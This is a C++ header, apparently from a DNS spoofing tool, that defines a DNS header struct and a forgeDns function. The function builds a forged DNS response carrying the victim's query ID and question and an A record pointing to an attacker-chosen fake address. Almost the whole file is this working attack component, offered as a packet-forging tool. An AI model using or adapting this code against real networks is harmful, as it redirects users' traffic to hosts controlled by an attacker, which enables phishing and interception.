/*
    DNS Header for packet forging
    Copyright (C) 2016 unh0lys0da

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

#include <vector>

#include <arpa/inet.h>
#include <endian.h>
#include <stdint.h>
#include <string.h>

using UCharVector = std::vector<unsigned char>;

#define DNS_QUERY 0
#define DNS_RESPONSE 1

typedef struct {
    uint16_t id;
#if __BYTE_ORDER == __BIG_ENDIAN
    uint16_t qr : 1;
    uint16_t opcode : 4;
    uint16_t aa : 1;
    uint16_t tc : 1;
    uint16_t rd : 1;
    uint16_t ra : 1;
    uint16_t zero : 3;
    uint16_t rcode : 4;
#elif __BYTE_ORDER == __LITTLE_ENDIAN
    uint16_t rd : 1;
    uint16_t tc : 1;
    uint16_t aa : 1;
    uint16_t opcode : 4;
    uint16_t qr : 1;
    uint16_t rcode : 4;
    uint16_t zero : 3;
    uint16_t ra : 1;
#else
#error "Adjust your <bits/endian.h> defines"
#endif
    uint16_t qcount;  /* question count */
    uint16_t ancount; /* Answer record count */
    uint16_t nscount; /* Name Server (Autority Record) Count */
    uint16_t adcount; /* Additional Record Count */
} dnshdr;

inline int forgeDns(const dnshdr *dnsHeader, const struct in_addr *fakeAddr,
                    unsigned char *output) {
    int size;
    unsigned char *query = (unsigned char *)((unsigned char *)dnsHeader + sizeof(dnshdr));

    ((dnshdr *)output)->id = dnsHeader->id;
    ((dnshdr *)output)->qcount = htons(1);
    ((dnshdr *)output)->ancount = htons(1);
    ((dnshdr *)output)->nscount = htons(0);
    ((dnshdr *)output)->adcount = htons(0);
    // flags
    output[2] = 0x81;
    output[3] = 0x80;

    // first get the total size of the query, name + class + type
    for (size = 0; query[size] != 0; size++)
        ;
    // set the correct total size of the query
    // 2 for type, 2 for class, 1 for null byte
    size += 2 + 2 + 1;

    // copy the query to the output
    memcpy(output + sizeof(dnshdr), query, size);

    // set the correct total size
    size += sizeof(dnshdr);

    // create the dns answer
    // pointer to q name
    memcpy(output + size, "\xc0\x0c", 2);
    size += 2;
    // type
    memcpy(output + size, "\x00\x01", 2);
    size += 2;
    // class
    memcpy(output + size, "\x00\x01", 2);
    size += 2;
    // TTL
    memcpy(output + size, "\x00\x00\x00\x22", 4);
    size += 4;
    // data length
    memcpy(output + size, "\x00\x04", 2);
    size += 2;
    // data
    memcpy(output + size, fakeAddr, 4);
    size += 4;

    return size;
}
